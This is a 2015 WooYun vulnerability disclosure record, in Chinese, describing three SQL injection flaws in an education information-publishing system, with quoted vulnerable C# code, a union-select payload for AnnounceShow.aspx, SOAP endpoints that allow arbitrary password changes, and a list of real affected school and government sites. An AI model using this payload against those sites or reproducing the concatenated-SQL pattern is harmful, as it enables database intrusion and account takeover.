{"id": 29083, "wybug_id": "wooyun-2015-0120504", "wybug_title": "某通用教育系统3枚注入外加WEBSVC SOAP注入方式", "wybug_corp": "杭州东方盈动信息技术有限公司", "wybug_author": "Damo", "wybug_date": "2015-06-16 12:53", "wybug_open_date": "2015-09-19 07:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向公众公开  简要描述： 已补充的洞洞求审核 wooyun-2015-0118737 详细说明：  系统：盈动信息发布系统注入1：问题文件：AnnounceShow.aspx问题参数：Id代码分析：\nprotected void Page_Load(object sender, EventArgs e)\t\t{\t\t\t...略\t\t\t\t\tstring id = this.Page.Request.QueryString[\"Id\"];/*URL传参*/\t\t\t\t\tthis.LoadMe(id);/*直接将string字符串代入该方法 跟进方法*/\t\t\t\t略...\t\t}private void LoadMe(string id){\tDataTable announceist = this.GetAnnounceist(id);/*参数未处理直接代入 GetAnnounceist方法*/\t 略...}public DataTable GetAnnounceist(string id){\tint trueWebID = Globals.get_TrueWebID();\tstring str = \"A.ID ='\" + id + \"' \";/*直接SQL拼接导致注入*/\tSqlConnection sqlConnection = new SqlConnection(Globals.get_ConnectStr());\tSqlCommand selectCommand = new SqlCommand(\"SELECT A.* FROM Announces A WHERE \" + str, sqlConnection);\tSqlDataAdapter sqlDataAdapter = new SqlDataAdapter(selectCommand);\tDataSet dataSet = new DataSet(\"ClassDataSet\");\tsqlConnection.Open();\tsqlDataAdapter.Fill(dataSet, \"ClassData\");\tsqlConnection.Close();\treturn dataSet.Tables[\"ClassData\"];}\n利用方式：URL:/AnnounceShow.aspx?Id=1122221' union all select 1,'wooyun',@@VERSION,null,null,null,null,null,null,null,null,null--例如：http://www.dqjy.cn/AnnounceShow.aspx?Id=1122221' union all select 1,'wooyun',@@VERSION,null,null,null,null,null,null,null,null,null--结果如下图：\n\n注入2为webSVC注入问题文件：WebService/WebUserDataProcess.asmx问题接口：UseOrUnUseUser问题参数：strUserGuid代码分析：\n[WebMethod]\t\tpublic string UseOrUnUseUser(string strUserGuid, string strIsUse)\t\t{\t\t\tWebBFSynBase webBFSynBase = new WebBFSynBase();\t\t\tbool blIsUse = !(strIsUse == \"启用\");\t\t\treturn webBFSynBase.UseOrUnUseUser(strUserGuid, blIsUse).ToString();/*未过滤直接将参数strUserGuid带入到UseOrUnUseUser*/\t\t}// WebBFSynBasepublic string UseOrUnUseUser(string strUserGuid, bool blIsUse){\tstring text = \"\";\tstring cmdText = string.Concat(new object[]\t{\t\t\" update Users set LockUser ='\",\t\tblIsUse,\t\t\"' where Guid ='\",\t\tstrUserGuid,/*SQL拼接导致注入*/\t\t\"'\"\t});\t 略....\treturn result;}\n调用此SVC只能通过SOAP 1.1 或者SOAP 1.2 所以我本地创建了一个c#的请求代码，利用方式下面压缩包中有代码利用代码：http://pan.baidu.com/s/1dNdOa        7x2e结果如图：\n\n注入3为webSVC注入同时可以更改任意用户密码，也是SOAP方式，问题文件：WebService/WebUserDataProcess.asmx问题接口：UpdatePassword问题参数：strUserGuid和strUserPass代码分析：\n[WebMethod]\t\tpublic string UpdatePassword(string strUserGuid, string strUserPass)\t\t{\t\t\tWebBFSynBase webBFSynBase = new WebBFSynBase();\t\t\treturn webBFSynBase.UpdatePwd(strUserGuid, strUserPass);/*未过滤直接将参数带入到webBFSynBase.UpdatePwd*/\t\t}public string UpdatePwd(string strUserGuid, string strUserPass){\tstring a = \"\";\tSqlConnection sqlConnection = new SqlConnection(Globals.get_ConnectStr());\tSqlCommand sqlCommand = new SqlCommand(string.Concat(new string[]\t{\t\t\"Update Users Set Password='\",\t\tstrUserPass,/*SQL拼接*/\t\t\"' WHERE Guid='\",\t\tstrUserGuid,/*SQL拼接*/\t\t\"'\"\t}), sqlConnection);try\t{\t\tsqlConnection.Open();\t\tint num = sqlCommand.ExecuteNonQuery();\t}\tcatch (SqlException ex)\t{\t\ta = ex.Message;/*SQL错误信息*/\t}\tfinally\t{\t\tsqlConnection.Close();\t}\tstring result;\tif (a != \"\")/*将错误信息过滤掉*/\t{\t\tresult = \"false\";\t}\telse\t{\t\tresult = \"true\";\t}\treturn result;}\n上面代码将错误信息过滤掉了，另外目前的注入工具好像没有SOAP方式注入的,这个地方只是慢慢猜解的过程以及执行update delete bak等命令 利用方式和注入2一样   漏洞证明：  注入1\n\n注入2\n\n案例：http://www.hzlyzx.comhttp://www.jgedu.nethttp://www.hzjlxx.comhttp://www.jhjdedu.orghttp://www.dqjy.cnhttp://www.hzedu.gov.cn （有狗，第一种注入失败，但是SVC的注入是OK的）   修复方案：  过滤 或参数化或@程序员   版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-06-21 07:57 厂商回复： cnvd确认并复现所述情况，暂未能建立与软件生产厂商的直接处置渠道，案例暂不涉及政府和重要部门，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}